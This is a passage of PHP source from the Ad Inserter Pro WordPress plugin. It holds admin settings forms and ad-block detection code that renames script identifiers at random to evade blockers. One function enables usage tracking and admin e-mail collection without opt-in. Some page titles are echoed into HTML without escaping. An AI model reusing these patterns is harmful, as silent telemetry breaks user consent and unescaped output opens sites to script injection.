                      <option value="<?php echo AI_ENABLED; ?>" <?php echo get_click_fraud_protection () == AI_ENABLED ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ENABLED; ?></option>
                    </select>
                  </span>
                  <span style="float: right;">
                    <?php _e ('Protection time', 'ad-inserter'); ?>
                    <input type="text" name="cfp-time" value="<?php echo get_click_fraud_protection_time (); ?>"  default="<?php echo DEFAULT_CLICK_FRAUD_PROTECTION_TIME; ?>" title="<?php _e ('Time period in days in which blocks with enabled click fraud protection will be hidden. Use decimal value (with decimal point) for shorter periods.', 'ad-inserter'); ?>" size="6" maxlength="3" /> <?php echo _n ('day', 'days', get_click_fraud_protection_time (), 'ad-inserter'); ?>
                  </span>
                </td>
              </tr>
<?php
  }
?>
            </tbody>
          </table>
        </div>

<?php
  if (defined ('AD_INSERTER_REPORTS')) {
?>
        <div class="rounded" style="margin: 8px 0 8px;">
          <table style="width: 100%;">
            <tbody>
              <tr>
                <td style="width: 22%;">
                  <?php _e ('Report header image', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="report-header-image" style="margin-left: 0px; width: 95%;" title="<?php _e ("Image or logo to be displayed in the header of the statistins report. Aabsolute path starting with '/' or relative path to the image file. Clear to reset to default image.", 'ad-inserter'); ?>" type="text" name="report-header-image" value="<?php echo get_report_header_image (); ?>" default="<?php echo DEFAULT_REPORT_HEADER_IMAGE; ?>" maxlength="80" />
                  <button id="report-header-image-button" type="button" class='ai-button' style="display: none; outline: transparent; float: right; margin-top: 4px; width: 15px; height: 15px;" title="<?php _e ('Select or upload header image', 'ad-inserter'); ?>" data=home="<?php echo home_url (), '/'; ?>"></button>
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Report header title', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="report-header-title" style="margin-left: 0px; width: 100%;" title="<?php _e ("Title to be displayed in the header of the statistics report. Text or HTML code, clear to reset to default text.", 'ad-inserter'); ?>" type="text" name="report-header-title" value="<?php echo get_report_header_title (); ?>" default="<?php echo DEFAULT_REPORT_HEADER_TITLE; ?>" maxlength="180" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Report header description', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="report-header-description" style="margin-left: 0px; width: 100%;" title="<?php _e ("Description to be displayed in the header of the statistics report. Text or HTML code, clear to reset to default text.", 'ad-inserter'); ?>" type="text" name="report-header-description" value="<?php echo get_report_header_description (); ?>" default="<?php echo DEFAULT_REPORT_HEADER_DESCRIPTION; ?>" maxlength="180" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Report footer', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="report-footer" style="margin-left: 0px; width: 100%;" title="<?php _e ("Text to be displayed in the footer of the statistics report. Clear to reset to default text.", 'ad-inserter'); ?>" type="text" name="report-footer" value="<?php echo get_report_footer (); ?>" default="<?php echo DEFAULT_REPORT_FOOTER; ?>" maxlength="180" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Public report key', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="report-key" style="margin-left: 0px; width: 100%;" title="<?php _e ("String to generate unique report IDs. Clear to reset to default value.", 'ad-inserter'); ?>" type="text" name="report-key" value="<?php echo get_report_key (); ?>" default="<?php echo DEFAULT_REPORT_KEY; ?>" maxlength="64" />
                </td>
              </tr>
            </tbody>
          </table>
        </div>
<?php
  }
?>

        <div class="rounded" style="margin: 8px 0 8px;">
          <table style="width: 100%;">
            <tbody>
              <tr>
                <td style="width: 22%;">
                  <?php _e ('Event category', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="external-tracking-category" style="margin-left: 0px; width: 100%;" title="<?php _e ("Category name used for external tracking events. You can use tags to get the event, the number or the name of the block that caused the event.", 'ad-inserter'); ?>" type="text" name="external-tracking-category" value="<?php echo get_external_tracking_category (); ?>" default="<?php echo DEFAULT_EXTERNAL_TRACKING_CATEGORY; ?>" maxlength="80" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Event action', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="external-tracking-action" style="margin-left: 0px; width: 100%;" title="<?php _e ("Action name used for external tracking events. You can use tags to get the event, the number or the name of the block that caused the event.", 'ad-inserter'); ?>" type="text" name="external-tracking-action" value="<?php echo get_external_tracking_action (); ?>" default="<?php echo DEFAULT_EXTERNAL_TRACKING_ACTION; ?>" maxlength="80" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Event label', 'ad-inserter'); ?>
                </td>
                <td>
                  <input id="external-tracking-label" style="margin-left: 0px; width: 100%;" title="<?php _e ("Label name used for external tracking events. You can use tags to get the event, the number or the name of the block that caused the event.", 'ad-inserter'); ?>" type="text" name="external-tracking-label" value="<?php echo get_external_tracking_label (); ?>" default="<?php echo DEFAULT_EXTERNAL_TRACKING_LABEL; ?>" maxlength="80" />
                </td>
              </tr>
            </tbody>
          </table>
        </div>

      </div>
    </div>
<?php
  }
?>

<?php
  if ($exceptions !== false):
?>
    <div id="tab-exceptions" class="rounded">

<?php
  if (!empty ($exceptions)) {
?>
      <div class="responsive-table">
        <table class="exceptions" cellspacing=0 cellpadding=0>
          <tbody>
            <tr><th></th><th></th><th class="page-title"></th>
<?php
  for ($block = $start; $block <= $end; $block ++) {
?>
              <th><input id="clear-exceptions-<?php echo $block; ?>"
                onclick="if (confirm('<?php _e ('Are you sure you want to clear all exceptions for block', 'ad-inserter'); ?> <?php echo $block; ?>?')) {document.getElementById ('clear-exceptions-<?php echo $block; ?>').style.visibility = 'hidden'; document.getElementById ('clear-exceptions-<?php echo $block; ?>').style.fontSize = '1px'; document.getElementById ('clear-exceptions-<?php echo $block; ?>').value = '<?php echo $block; ?>'; return true;} return false"
                title="<?php _e ('Clear all exceptions for block', 'ad-inserter'); ?> <?php echo $block; ?>"
                name="<?php echo AI_FORM_CLEAR_EXCEPTIONS; ?>"
                value="&#x274C;" type="submit" style="padding: 1px 3px; border: 0; background: transparent; font-size: 8px; color: #e44; box-shadow: none; vertical-align: baseline;" /></th>
<?php
  }
?>
              <th>
                <input id="clear-exceptions" onclick="if (confirm('<?php _e ('Are you sure you want to clear all exceptions?', 'ad-inserter'); ?>')) {return true;} return false" title="<?php _e ('Clear all exceptions for all blocks', 'ad-inserter'); ?>" name="<?php echo AI_FORM_CLEAR_EXCEPTIONS; ?>" value="&#x274C;" type="submit" style="padding: 1px 3px; border: 1px solid red; margin: 0; background: transparent; font-size: 10px; font-weight: bold; color: #e44;" />
              </th>
            </tr>

            <tr>
              <th class="id">ID</th><th class="type"><?php _e ('Type', 'ad-inserter'); ?></th><th class="page-title"><?php _e ('Title', 'ad-inserter'); ?></th>
<?php

  $default_insertion = array ();
  for ($block = $start; $block <= $end; $block ++) {
    $obj = $block_object [$block];
    echo '<th class="block" title="', $obj->get_ad_name (), '">', $block, '</th>';
    $default_insertion [$block] = $obj->get_exceptions_enabled () ? $obj->get_exceptions_function () : AI_IGNORE_EXCEPTIONS;
  }
?>
              <th></th>
            </tr>
<?php
  $index = 0;
  foreach ($exceptions as $id => $exception) {
    $selected_blocks = explode (",", $exception ['blocks']);
    $row_class = $index % 2 == 0 ? 'even' : 'odd';

    echo '            <tr class="', $row_class, '"><td class="id" title="', __('View', 'ad-inserter'), '"><a href="', get_permalink ($id), '" target="_blank" style="color: #222;">', $id, '</a></td><td class="type" title="', __('View', 'ad-inserter'), '"><a href="', get_permalink ($id), '" target="_blank" style="color: #222;">',
    $exception ['name'], '</a></td><td class="page-title" title="', __('Edit', 'ad-inserter'), '"><a href="', get_edit_post_link ($id), '" target="_blank" style="color: #222;">', $exception ['title'], '</a></td>';

    for ($block = $start; $block <= $end; $block ++) {
      if (in_array ($block, $selected_blocks)) {
        $obj = $block_object [$block];
        switch ($default_insertion [$block]) {
          case AI_DEFAULT_INSERTION_ENABLED:
            $title = __('Edit', 'ad-inserter');
            $ch = '<a href="' . get_edit_post_link ($id) . '" style="text-decoration: none; box-shadow: 0 0 0;" target="_blank">&#10006;</a>';
            break;
          case AI_DEFAULT_INSERTION_DISABLED:
            $title = __('Edit', 'ad-inserter');
            $ch = '<a href="' . get_edit_post_link ($id) . '" style="text-decoration: none; box-shadow: 0 0 0;" target="_blank">&#10004;</a>';
            break;
          case AI_IGNORE_EXCEPTIONS:
            $ch = '&nbsp;';
            $title = '';
            break;
        }
      } else {
          $ch = '&nbsp;';
          $title = '';
        }
      echo '<td class="block" title="', $title, '">', $ch, '</td>';
    }

    $page_name = $exception ['name'];
?>
              <td class="button-delete" title="<?php echo $title; ?>">
                <input id="clear-exceptions-id-<?php echo $id; ?>"
                  onclick="if (confirm('<?php _e ('Are you sure you want to clear all exceptions for', 'ad-inserter'); ?> <?php echo $page_name; ?> &#34;<?php echo $exception ['title']; ?>&#34;?')) {document.getElementById ('clear-exceptions-id-<?php echo $id; ?>').style.visibility = 'hidden'; document.getElementById ('clear-exceptions-id-<?php echo $id; ?>').style.fontSize = '1px'; document.getElementById ('clear-exceptions-id-<?php echo $id; ?>').value = 'id=<?php echo $id; ?>'; return true;} return false"
                  title="<?php _e ('Clear all exceptions for', 'ad-inserter'); ?> <?php echo $page_name; ?> &#34;<?php echo $exception ['title']; ?>&#34;"
                  name="<?php echo AI_FORM_CLEAR_EXCEPTIONS; ?>" value="&#x274C;" type="submit" style="height: 18px; padding: 1px 3px; border: 0; background: transparent; font-size: 8px; color: #e44; box-shadow: none; vertical-align: baseline;" />
              </td>
            </tr>
<?php
    $index ++;
  }
?>
          </tbody>
        </table>
      </div>

<?php
  } else echo '<div>' , __('No exceptions', 'ad-inserter'), '</div>';
?>
    </div>

<?php
  endif;

  if (is_multisite() && is_main_site ()) {
?>
    <div id="tab-multisite" class="rounded">
      <div style="margin: 0 0 8px 0;">
        <strong><?php /* translators: %s: Ad Inserter Pro */ printf (__('%s options for network blogs', 'ad-inserter'), AD_INSERTER_NAME); ?></strong>
      </div>
      <div style="margin: 8px 0;">
        <input type="hidden" name="multisite_widgets" value="0" />
        <input type="checkbox" name="multisite_widgets"id="multisite-widgets" value="1" default="<?php echo DEFAULT_MULTISITE_WIDGETS; ?>" <?php if (multisite_widgets_enabled ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-widgets" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Enable %s widgets for sub-sites', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php _e ('Widgets', 'ad-inserter'); ?></label>
      </div>
      <div style="margin: 8px 0;">
        <input type="hidden" name="multisite_php_processing" value="0" />
        <input type="checkbox" name="multisite_php_processing"id="multisite-php-processing" value="1" default="<?php echo DEFAULT_MULTISITE_PHP_PROCESSING; ?>" <?php if (multisite_php_processing ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-php-processing" title="<?php _e ('Enable PHP code processing for sub-sites', 'ad-inserter'); ?>"><?php _e ('PHP Processing', 'ad-inserter'); ?></label>
      </div>
      <div style="margin: 8px 0;">
        <input type="hidden" name="multisite_exceptions" value="0" />
        <input type="checkbox" name="multisite_exceptions"id="multisite-exceptions" value="1" default="<?php echo DEFAULT_MULTISITE_EXCEPTIONS; ?>" <?php if (multisite_exceptions_enabled ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-exceptions" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Enable %s block exceptions in post/page editor for sub-sites', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php _e ('Post/Page exceptions', 'ad-inserter'); ?></label>
      </div>
      <div style="margin: 8px 0;">
        <input type="hidden" name="multisite_settings_page" value="0" />
        <input type="checkbox" name="multisite_settings_page"id="multisite-settings-page" value="1" default="<?php echo DEFAULT_MULTISITE_SETTINGS_PAGE; ?>" <?php if (multisite_settings_page_enabled ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-settings-page" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Enable %s settings page for sub-sites', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php _e ('Settings page', 'ad-inserter'); ?></label>
      </div>
      <div style="margin: 8px 0 0 0;">
        <input type="hidden" name="multisite_main_for_all_blogs" value="0" />
        <input type="checkbox" name="multisite_main_for_all_blogs"id="multisite-main-on-all-blogs" value="1" default="<?php echo DEFAULT_MULTISITE_MAIN_FOR_ALL_BLOGS; ?>" <?php if (multisite_main_for_all_blogs ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-main-on-all-blogs" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Enable %s settings of main site to be used for all blogs', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php _e ('Main site settings used for all blogs', 'ad-inserter'); ?></label>
      </div>
      <div style="margin: 8px 0 0 0;">
        <input type="hidden" name="multisite_site_admin_page" value="0" />
        <input type="checkbox" name="multisite_site_admin_page"id="multisite-site-admin-page" value="1" default="<?php echo DEFAULT_MULTISITE_SITE_ADMIN_PAGE; ?>" <?php if (multisite_site_admin_page ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-site-admin-page" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Show link to %s settings page for each site on the Sites page', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php /* translators: %s: Ad Inserter Pro */ printf (__('Show link to %s on the Sites page', 'ad-inserter'), AD_INSERTER_NAME); ?></label>
      </div>
    </div>
<?php
  }
}

function ai_adb_settings () {
  $adb_detection  = get_adb_detection (); ?>
        <tr>
          <td>
            <?php _e ('Ad Blocking Detection', 'ad-inserter'); ?>
          </td>
          <td>
            <select
              id="adb-detection"
              name="adb-detection"
              title="<?php _e ('Standard method is reliable but should be used only if Advanced method does not work. Advanced method recreates files used for detection with random names, however, it may not work if the scripts in the upload folder are not publicly accessible', 'ad-inserter'); ?>"
              value="Value"
              default="<?php echo DEFAULT_ADB_DETECTION; ?>">
                <option value="<?php echo AI_ADB_DETECTION_STANDARD; ?>" <?php echo ($adb_detection == AI_ADB_DETECTION_STANDARD) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STANDARD; ?></option>
                <option value="<?php echo AI_ADB_DETECTION_ADVANCED; ?>" <?php echo ($adb_detection == AI_ADB_DETECTION_ADVANCED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ADVANCED; ?></option>
            </select>
          </td>
        </tr>
<?php }

function ai_system_debugging () {
  global $ai_db_options, $ad_inserter_globals;

  $ai_type = $ad_inserter_globals ['AI_TYPE'];
  if (!empty ($ai_type)) {
?>
        <tr class="system-debugging" style="display: none;">
          <td>
            Product
          </td>
          <td>
            <?php echo $ai_type; ?>
          </td>
        </tr>
<?php
  }

  $ai_status = $ad_inserter_globals ['AI_STATUS'];
  if (!empty ($ai_status)) {
?>
        <tr class="system-debugging" style="display: none;">
          <td>
            Status
          </td>
          <td>
            <?php echo $ai_status, ' set ', isset ($ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME]) ? date ("Y-m-d H:i:s", $ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME] + get_option ('gmt_offset') * 3600) : ""; ?>
          </td>
        </tr>
<?php
  }

  $ai_counter = $ad_inserter_globals ['AI_COUNTER'];
  $last_update = get_option (AI_UPDATE_NAME, '');
  if ($last_update != '') $last_update = ', set ' . date ("Y-m-d H:i:s", $last_update + get_option ('gmt_offset') * 3600);
  if (!empty ($ai_counter)) {
?>
        <tr class="system-debugging" style="display: none;">
          <td>
            Counter
          </td>
          <td>
            <?php echo $ai_counter, $last_update; ?>
          </td>
        </tr>
<?php
  }
}

function ai_system_output_check () {
  global $ad_inserter_globals;

  if (!is_multisite() || is_main_site ()) {
    $license_key = $ad_inserter_globals ['LICENSE_KEY'];
    if (empty ($license_key)) return true;
  }
  return false;
}

function ai_system_output () {
  global $ad_inserter_globals, $ai_wp_data;

  if (!is_multisite() || is_main_site ()) {
    if (!defined ('DOING_AJAX') || !DOING_AJAX) {
      $license_key = $ad_inserter_globals ['LICENSE_KEY'];
      if (empty ($license_key)) {
        if ($ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_HOMEPAGE ||
            $ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_STATIC ||
            $ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_POST ||
            $ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_CATEGORY ||
            $ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_SEARCH ||
            $ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_ARCHIVE) {
          echo "\n<!-- This website uses unlicensed copy of ", AD_INSERTER_NAME, " ", AD_INSERTER_VERSION, " https://adinserter.pro/ -->\n";
        }
      }
    }
  }
}

function ai_rename_ids ($text) {
  global $ai_adb_names, $ai_adb_new_names;

  if (isset ($ai_adb_names) && isset ($ai_adb_new_names)) {
    foreach ($ai_adb_names as $index => $name) {
      $text = str_replace ($name, $ai_adb_new_names [$index], $text);
    }
  }

  return $text;
}

function add_footer_inline_scripts_3 () {
  return ai_rename_ids ("ai_adb_fe_dbg = true;");
}

function ai_random_name ($seed, $length = 10) {
//  $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
//  $charactersLength = strlen ($characters);
//  $randomString = '';
//  for ($i = 0; $i < $length; $i++) {
//    $randomString .= $characters [rand (0, $charactersLength - 1)];
//  }
//  return $randomString;


  return substr (substr (preg_replace ("/[^A-Za-z]+/", '', strtolower (md5 (AUTH_KEY.$seed))), 0, 4) . preg_replace ("/[^A-Za-z0-9]+/", '', strtolower (md5 ($seed.NONCE_KEY))), 0, $length);
  // Possible caching issues when changing names AI_ADB_3_NAME1, AI_ADB_3_NAME2, AI_ADB_4_NAME1, AI_ADB_4_NAME2,
//  return substr (substr (preg_replace ("/[^A-Za-z]+/", '', strtolower (md5 (AUTH_KEY.$seed.time()))), 0, 4) . preg_replace ("/[^A-Za-z0-9]+/", '', strtolower (md5 ($seed.NONCE_KEY.time()))), 0, $length);
}

function ai_content (&$content) {
  global $ai_wp_data;

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {
    if ($ai_wp_data [AI_ADB_DETECTION] && ($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_TAGS) == 0 && defined ('AI_ADB_CONTENT_CSS_BEGIN_CLASS')) {
      $content = str_replace (AI_ADB_CONTENT_CSS_BEGIN,     AI_ADB_CONTENT_CSS_BEGIN_CLASS, $content);
      $content = str_replace (AI_ADB_CONTENT_CSS_END,       AI_ADB_CONTENT_CSS_END_CLASS, $content);
      $content = str_replace (AI_ADB_CONTENT_DELETE_BEGIN,  AI_ADB_CONTENT_DELETE_BEGIN_CLASS, $content);
      $content = str_replace (AI_ADB_CONTENT_DELETE_END,    AI_ADB_CONTENT_DELETE_END_CLASS, $content);
      $content = str_replace (AI_ADB_CONTENT_REPLACE_BEGIN, AI_ADB_CONTENT_REPLACE_BEGIN_CLASS, $content);
      $content = str_replace (AI_ADB_CONTENT_REPLACE_END,   AI_ADB_CONTENT_REPLACE_END_CLASS, $content);
    }
  }
}

function ai_replace_js_data_2 (&$vars) {
  if (defined ('AI_ADB_CONTENT_CSS_BEGIN_CLASS')) {
    $vars = str_replace ('AI_ADB_CONTENT_CSS_BEGIN_CLASS',      AI_ADB_CONTENT_CSS_BEGIN_CLASS, $vars);
    $vars = str_replace ('AI_ADB_CONTENT_CSS_END_CLASS',        AI_ADB_CONTENT_CSS_END_CLASS, $vars);
    $vars = str_replace ('AI_ADB_CONTENT_DELETE_BEGIN_CLASS',   AI_ADB_CONTENT_DELETE_BEGIN_CLASS, $vars);
    $vars = str_replace ('AI_ADB_CONTENT_DELETE_END_CLASS',     AI_ADB_CONTENT_DELETE_END_CLASS, $vars);
    $vars = str_replace ('AI_ADB_CONTENT_REPLACE_BEGIN_CLASS',  AI_ADB_CONTENT_REPLACE_BEGIN_CLASS, $vars);
    $vars = str_replace ('AI_ADB_CONTENT_REPLACE_END_CLASS',    AI_ADB_CONTENT_REPLACE_END_CLASS, $vars);
  }
}

function ai_check_files () {
  global $ai_adb_id, $ai_adb_names, $ai_adb_new_names, $ai_wp_data;

  $ai_adb_base_name = $_SERVER ['DOCUMENT_ROOT'];
  $ai_adb_id = substr (preg_replace ("/[^A-Za-z0-9]+/", '', strtolower (md5 ($_SERVER ['DOCUMENT_ROOT'].NONCE_KEY))), 0, 7 + strlen ($ai_adb_base_name) % 5);

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_1)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_1, strtolower (ai_random_name (AI_TRANSIENT_ADB_CLASS_1, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_CSS_BEGIN_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_1));

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_2)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_2, strtolower (ai_random_name (AI_TRANSIENT_ADB_CLASS_2, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_CSS_END_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_2));

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_3)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_3, strtolower (ai_random_name (AI_TRANSIENT_ADB_CLASS_3, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_DELETE_BEGIN_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_3));

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_4)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_4, strtolower (ai_random_name (AI_TRANSIENT_ADB_CLASS_4, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_DELETE_END_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_4));

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_5)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_5, strtolower (ai_random_name (AI_TRANSIENT_ADB_CLASS_5, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_REPLACE_BEGIN_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_5));

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_6)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_6, strtolower (ai_random_name (AI_TRANSIENT_ADB_CLASS_6, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_REPLACE_END_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_6));

  if (get_adb_detection () == AI_ADB_DETECTION_ADVANCED) {
    $upload_dir = wp_upload_dir();
    $script_path_ai = $upload_dir ['basedir'] . '/ad-inserter/';
    $script_path = $script_path_ai.$ai_adb_id.'/';

    if (isset ($_POST [AI_FORM_CLEAR])) {
      include_once (ABSPATH . 'wp-includes/pluggable.php');

      check_admin_referer ('save_adinserter_settings');
      recursive_remove_directory ($script_path_ai);
    }

//    $recreate_files = $ai_wp_data [AI_FRONTEND_JS_DEBUGGING] || file_exists ($script_path . AI_ADB_DBG_FILENAME) || get_transient (AI_TRANSIENT_ADB_FILES_VERSION) != AD_INSERTER_VERSION;
//    if (!file_exists ($script_path_ai) || !file_exists ($script_path) || defined ('AI_ADB_2_FILE_RECREATED') || $recreate_files) {

    $recreate_files =
//      time () - filemtime ($script_path . AI_ADB_FOOTER_FILENAME) > AI_TRANSIENT_ADB_CLASS_EXPIRATION ||
      $ai_wp_data [AI_FRONTEND_JS_DEBUGGING] ||
      file_exists ($script_path . AI_ADB_DBG_FILENAME) ||
      get_transient (AI_TRANSIENT_ADB_FILES_VERSION) != AD_INSERTER_VERSION ||
      defined ('AI_ADB_2_FILE_RECREATED') ||
      !file_exists ($script_path_ai) ||
      !file_exists ($script_path) ||
      !file_exists ($script_path . AI_ADB_FOOTER_FILENAME);

    if ($recreate_files) {

      set_transient (AI_TRANSIENT_ADB_FILES_VERSION, AD_INSERTER_VERSION, 0);

  //    $ai_subdirs = glob ($script_path_ai.'*', GLOB_ONLYDIR);
  //    foreach ($ai_subdirs as $ai_subdir) {
  //      if (file_exists ($ai_subdir.'/'.AI_ADB_1_FILENAME))
  //        recursive_remove_directory ($ai_subdir);
  //    }


      $ai_adb_names = array (
        AI_ADB_1_NAME,
        AI_ADB_2_NAME,
        AI_ADB_3_NAME1,
        AI_ADB_3_NAME2,
        AI_ADB_4_NAME1,
        AI_ADB_4_NAME2,
        'ai_adb_debugging',
        'ai_debugging_active',
        'ai_adb_active',
        'ai_adb_counter',
        'ai_adb_detected',
        'ai_adb_undetected',
        'ai_adb_overlay',
        'ai_adb_message_window',
        'ai_adb_message_undismissible',
        'ai_adb_act_cookie_name',
        'ai_adb_message_cookie_lifetime',
        'ai_adb_pgv_cookie_name',
        'ai_adb_action',
        'ai_adb_page_views',
        'ai_adb_page_view_counter',
        'ai_adb_selectors',
        'ai_adb_selector',
        'ai_adb_el_counter',
        'ai_adb_el_zero',
        'ai_adb_redirecstion_url',
        'ai_adb_page_redirection_cookie_name',
        'ai_adb_process_content',
        'ai_adb_parent',
        'ai_adb_action',
        'ai_adb_css',
        'ai_adb_style',
        'ai_adb_status',
        'ai_adb_text',
        'ai_adb_redirection_url',
        'ai_adb_detection_type_log',
        'ai_adb_detection_type',
        'ai_adb_fe_dbg',
      );

      $ai_adb_new_names = array ();
      foreach ($ai_adb_names as $name) {
        $ai_adb_new_names []= ai_random_name ($name, 12);
      }

      @mkdir ($script_path_ai, 0755, true);
      @mkdir ($script_path, 0755, true);

      $script = file_get_contents (AD_INSERTER_PLUGIN_DIR.'js/'.AI_ADB_1_FILENAME);
      file_put_contents ($script_path . AI_ADB_1_FILENAME, ai_rename_ids ($script));

      $script = file_get_contents (AD_INSERTER_PLUGIN_DIR.'js/'.AI_ADB_2_FILENAME);
      file_put_contents ($script_path . AI_ADB_2_FILENAME, ai_rename_ids ($script));

      $script = file_get_contents (AD_INSERTER_PLUGIN_DIR.'js/'.AI_ADB_3_FILENAME);
      file_put_contents ($script_path . AI_ADB_3_FILENAME, ai_rename_ids ($script));

      $script = file_get_contents (AD_INSERTER_PLUGIN_DIR.'js/'.AI_ADB_4_FILENAME);
      file_put_contents ($script_path . AI_ADB_4_FILENAME, ai_rename_ids ($script));

      $code = ai_adb_code () . ai_adb_code_2 ();
      $code = str_replace ('AI_CONST_AI_ADB_1_NAME', AI_ADB_1_NAME, $code);
      $code = str_replace ('AI_CONST_AI_ADB_2_NAME', AI_ADB_2_NAME, $code);
      file_put_contents ($script_path . AI_ADB_FOOTER_FILENAME, ai_rename_ids ($code));

      file_put_contents ($script_path_ai .  'index.php', "<?php header ('Status: 404 Not found'); ?".">\nNot found");
      file_put_contents ($script_path .     'index.php', "<?php header ('Status: 404 Not found'); ?".">\nNot found");

      if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING]) file_put_contents ($script_path . AI_ADB_DBG_FILENAME, ''); else @unlink ($script_path . AI_ADB_DBG_FILENAME);
    }
  }
}

function ai_adb_code_2 () {
  return ai_get_js ('ai-adb-pro', false);
}

function ai_dst_settings (&$dst_settings) {
  if (defined ('AI_PLUGIN_TRACKING') && AI_PLUGIN_TRACKING) {
    $dst_settings ['tracking']            = DST_Client::DST_TRACKING_NO_OPTIN;
    $dst_settings ['use_email']           = DST_Client::DST_USE_EMAIL_NO_OPTIN;
    $dst_settings ['multisite_tracking']  = DST_Client::DST_MULTISITE_SITES_NO_OPTIN;
    $dst_settings ['deactivation_form']   = false;
  }
}

function add_footer_inline_scripts_1 () {
  global $ai_wp_data, $ai_adb_id, $block_object;

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {

    if ($ai_wp_data [AI_ADB_DETECTION] && !isset ($ai_wp_data [AI_ADB_SHORTCODE_DISABLED])) {

      if (get_adb_detection () == AI_ADB_DETECTION_ADVANCED) {
        $upload_dir = wp_upload_dir();
        $script_url = $upload_dir ['baseurl'] . '/ad-inserter/'.$ai_adb_id.'/';

        $script_path_ai = $upload_dir ['basedir'] . '/ad-inserter/';
        $script_path = $script_path_ai.$ai_adb_id.'/';

      } else {
          $script_url = plugins_url ('js/', AD_INSERTER_FILE);

          $script_path = AD_INSERTER_PLUGIN_DIR.'js/';
        }

      if (is_ssl()) {
        $script_url = str_replace ('http://', 'https://', $script_url);
      }

      echo '<!-- Code for ad blocking detection -->', "\n";
      echo '<!--noptimize-->', "\n";
      if (!defined ('AI_ADB_NO_BANNER_AD')) {
//        echo '<div id="banner-advert-container" class="adsense sponsor-ad" style="position:absolute; z-index: -10; height: 1px; width: 1px; top: -1px; left: -1px;"><img id="im_popupFixed" class="ad-inserter adsense ad-img ad-index" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></div>', "\n";
        echo '<div id="banner-advert-container" class="adsense sponsor-ad" style="position:absolute; z-index: -10; height: 1px; width: 1px; top: -1px; left: -1px;"><img id="im_popupFixed" class="ad-inserter adsense ad-img ad-index" src="', AD_INSERTER_PLUGIN_IMAGES_URL, 'ads.png"></div>', "\n";
      }
      if (!defined ('AI_ADB_NO_GOOGLE_ADSENSE')) {
